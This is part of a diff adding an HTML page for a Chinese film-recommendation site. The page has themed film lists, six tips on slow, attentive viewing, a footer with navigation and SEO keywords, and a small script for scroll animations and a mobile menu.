+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">GF05</span><h3>留白：山水之间，不必多言</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《悲情城市》</b>侯孝贤用沉默，讲完了整个时代的伤口。<em>02:38</em></li>
+            <li><b>《童年往事》</b>“日子，就是这么一天一天过去的。”<em>01:50</em></li>
+            <li><b>《恋恋风尘》</b>侯孝贤最温柔的一部，关于离开与接受。<em>01:26</em></li>
+            <li><b>《小森林》</b>一个人吃饭，也可以很隆重。<em>00:38</em></li>
+            <li><b>《海街日记》</b>四姐妹、一院子梅子酒、一场没到来的葬礼。<em>01:18</em></li>
+            <li><b>《步履不停》</b>妈妈做的菜，是最难回绝的关心，也是最深的捆绑。<em>01:14</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">GF06</span><h3>戏曲：人生如戏，戏如人生</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《霸王别姬》</b>不疯魔，不成活。<em>02:48</em></li>
+            <li><b>《梅兰芳》</b>“输不丢人，怕才丢人。”<em>01:44</em></li>
+            <li><b>《变脸》</b>吴天明用川剧的变脸，讲一个关于“传承”的老故事。<em>01:30</em></li>
+            <li><b>《舞台姐妹》</b>谢晋最被低估的一部，关于越剧、姐妹与时代。<em>01:52</em></li>
+            <li><b>《活着》</b>张艺谋把“活着”这件事，讲得比任何悲剧都重。<em>02:46</em></li>
+            <li><b>《那人那山那狗》</b>“山里的人，一辈子就走一条路。”<em>01:18</em></li>
+          </ol>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑤ 观影指南 -->
+  <section id="guide" aria-labelledby="t5">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">伍</span>
+        <div>
+          <div class="en">HOW TO USE · 观影指南</div>
+          <h2 id="t5">慢看六则：古法观影，不赶场</h2>
+        </div>
+      </div>
+      <p class="lead">挑片不是 4000 个推荐，是一个<b>心境问题</b>。以下六则，帮你在算法失效的地方，找回自己的口味。</p>
+
+      <div class="guide">
+        <div class="gd rv"><span class="st">RULE 01</span><h3>慢，才有余味</h3><p>好电影的妙处，常常在第三遍才出现。第一遍看剧情，第二遍看表演，第三遍看构图与留白。别急着“看完”，要学着“看完之后还在想”。</p><span class="no" aria-hidden="true">01</span></div>
+        <div class="gd rv"><span class="st">RULE 02</span><h3>关灯，手机翻过去</h3><p>仪式感不是矫情。黑暗让画面成立，静音让对白入心。97 分钟的片子，就给它 97 分钟，别让消息把它切成碎片。</p><span class="no" aria-hidden="true">02</span></div>
+        <div class="gd rv"><span class="st">RULE 03</span><h3>一次看完，别分段</h3><p>电影是被设计成“一口气”的。中间停下，等于自己给自己剧透情绪。情绪断了，余味就没了。</p><span class="no" aria-hidden="true">03</span></div>
+        <div class="gd rv"><span class="st">RULE 04</span><h3>看第二遍才算看过</h3><p>第一遍你跟着人物走，第二遍你跟着导演走。镜头为什么停在这里？对白为什么不说完？答案都在第二遍。</p><span class="no" aria-hidden="true">04</span></div>
+        <div class="gd rv"><span class="st">RULE 05</span><h3>允许它无聊三分钟</h3><p>侯孝贤、是枝裕和、塔尔可夫斯基，都会“无聊”你三分钟。那不是失误，是呼吸。忍住，后面全是礼物。</p><span class="no" aria-hidden="true">05</span></div>
+        <div class="gd rv"><span class="st">RULE 06</span><h3>看完，别急着说话</h3><p>散场时的那种安静，是影院给你的最好的东西。等它自己沉下去。若一定要说，就说一句：“这片子，让我想起一个人。”</p><span class="no" aria-hidden="true">06</span></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div class="f1">
+      <div class="flogo">
+        <span class="fan" aria-hidden="true"><i></i></span>
+        <span><b>贵妃电影网</b><span class="en">GUI · FEI · CINEMA</span></span>
+      </div>
+      <p style="margin-top:12px;max-width:42ch">贵妃电影网，一个讲“贵妃”的电影站。宫闱、权谋、爱情、舞蹈、华服、古典——用东方美学挑片、写影评、做片单。本站为影视资讯与观影指南站点，片源信息以各正版平台为准。</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <a href="#pick">今日片单</a>
+      <a href="#hue">华服色谱</a>
+      <a href="#note">深度影评</a>
+      <a href="#list">主题片单</a>
+      <a href="#guide">观影指南</a>
+    </div>
+    <div>
+      <h4>归档</h4>
+      <a href="#">宫闱</a>
+      <a href="#">爱情</a>
+      <a href="#">权谋</a>
+      <a href="#">华服</a>
+      <a href="#">留白</a>
+    </div>
+    <div class="copy">
+      <span>© 2026 <span class="kw">贵妃电影网</span> ｜ 网站网址：https://guifeiwangdianyingwang-cn.github.io</span>
+      <span>关键词：<span class="kw">贵妃电影网</span>、贵妃、电影、华语古装、宫斗、历史、爱情、华语电影、电影推荐、影评、片单、戏曲</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var io = new IntersectionObserver(function(es){
+    es.forEach(function(e){
+      if(!e.isIntersecting) return;
+      var el = e.target;
+      if(el.classList.contains('fill')){
+        el.style.width = (el.getAttribute('data-w') || '0') + '%';
+      }else{
+        el.classList.add('in');
+      }
+      io.unobserve(el);
+    });
+  }, {threshold:0.12, rootMargin:'0px 0px -40px'});
+
+  document.querySelectorAll('.rv, .fill').forEach(function(el){ io.observe(el); });
+
+  var mb = document.getElementById('mb'), nav = document.getElementById('nav');
+  mb.addEventListener('click', function(){
+    var o = nav.classList.toggle('open');
+    mb.setAttribute('aria-expanded', o ? 'true' : 'false');
+    document.body.classList.toggle('lock', o);
+  });
+  nav.addEventListener('click', function(e){
+    if(e.target.tagName === 'A'){
+      nav.classList.remove('open');
+      mb.setAttribute('aria-expanded','false');
+      document.body.classList.remove('lock');
+    }
+  });
+})();
+</script>
+</body>
+</html>
